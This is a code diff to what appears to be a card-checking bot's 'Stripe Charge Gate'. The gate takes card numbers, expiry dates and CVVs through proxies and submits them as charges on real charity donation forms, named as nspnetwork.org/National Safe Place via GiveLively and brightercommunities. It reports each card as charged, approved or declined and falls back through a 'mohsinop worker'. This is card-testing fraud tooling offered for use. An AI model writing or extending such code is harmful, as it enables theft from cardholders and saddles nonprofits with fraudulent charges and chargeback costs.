@@ -1,6 +1,6 @@
 """
-Stripe Charge Gate - BrighterCommunities Give Donation Form
-Uses WordPress Give + Stripe. Flow: donate page -> load gateway -> payment_method -> submit donation.
+Stripe Charge Gate - GiveLively (nspnetwork.org / National Safe Place)
+Primary: GiveLively donation flow. Fallback: mohsinop worker, then brightercommunities.
 Returns: {"status": "charged"|"approved"|"declined"|"error", "response": str}
 """
 
@@ -420,7 +420,33 @@ def _check_stripe_charge_sync(card: str, mes: str, ano: str, cvv: str, proxy: st
 
 
 async def async_stripe_charge_gate(card: str, mes: str, ano: str, cvv: str, proxy: str = None) -> dict:
-    """Async wrapper for Stripe Charge gate (brightercommunities)."""
+    """
+    Stripe Charge gate: GiveLively (nspnetwork) primary, mohsinop worker fallback.
+    Returns: {"status": "charged"|"approved"|"declined"|"error", "response": str}
+    """
+    from BOT.Charge.Stripe.givelively_charge import async_givelively_charge_gate
+    from BOT.Charge.Stripe.worker_api import async_stripe_worker_charge
+    # Primary: GiveLively (nspnetwork.org)
+    try:
+        result = await async_givelively_charge_gate(card, mes, ano, cvv, proxy)
+        err_resp = result.get("response", "")
+        if result.get("status") != "error" or err_resp not in (
+            "DONATE_PAGE_FAILED", "NO_CART_ID", "PAYMENT_INTENT_FAILED",
+            "TIMEOUT", "EMPTY_RESPONSE", "REQUEST_FAILED", "NO_RESPONSE",
+        ):
+            return result
+    except Exception:
+        pass
+    # Fallback: mohsinop worker
+    try:
+        result = await async_stripe_worker_charge(card, mes, ano, cvv, proxy)
+        if result.get("status") != "error" or result.get("response") not in (
+            "REQUEST_FAILED", "TIMEOUT", "NO_RESPONSE", "CANCELLED",
+        ):
+            return result
+    except Exception:
+        pass
+    # Fallback: brightercommunities
     loop = asyncio.get_event_loop()
     return await loop.run_in_executor(
         _executor,
